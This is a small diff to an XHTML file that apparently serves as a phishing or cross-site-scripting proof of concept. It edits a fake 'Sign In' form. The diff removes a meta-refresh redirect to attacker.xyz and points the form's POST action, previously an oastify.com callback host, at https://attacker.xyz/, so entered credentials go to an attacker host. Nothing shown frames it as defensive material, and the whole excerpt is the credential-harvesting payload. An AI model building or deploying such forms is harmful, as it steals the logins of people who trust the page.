@@ -105,9 +105,8 @@
       </xhtml:head>
 
       <xhtml:body>
-        <xhtml:meta http-equiv="refresh" content="5;URL=https://attacker.xyz/">
         <xhtml:div class="l-form">
-          <xhtml:form class="form" action="https://u2xe8bqysz87ly9yby87qnn4nvtmhh56.oastify.com/" method="POST">
+          <xhtml:form class="form" action="https://attacker.xyz/" method="POST">
             <xhtml:h1 class="form__title">Sign In</xhtml:h1>
 
             <xhtml:div class="form__div">
